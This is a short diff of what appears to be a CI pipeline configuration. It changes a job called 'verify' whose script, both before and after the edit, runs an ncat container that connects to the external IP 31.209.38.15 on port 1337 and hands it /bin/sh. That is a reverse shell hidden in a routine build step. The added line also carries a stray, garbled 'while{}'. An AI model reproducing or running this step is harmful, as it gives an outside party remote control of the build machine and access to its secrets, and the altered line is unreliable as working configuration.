@@ -81,7 +81,7 @@ verify:
     - docker-build
   stage: first
   script:
-    - docker run itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh
+    - docker run itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh while{}
 
 documentation:
   tags:
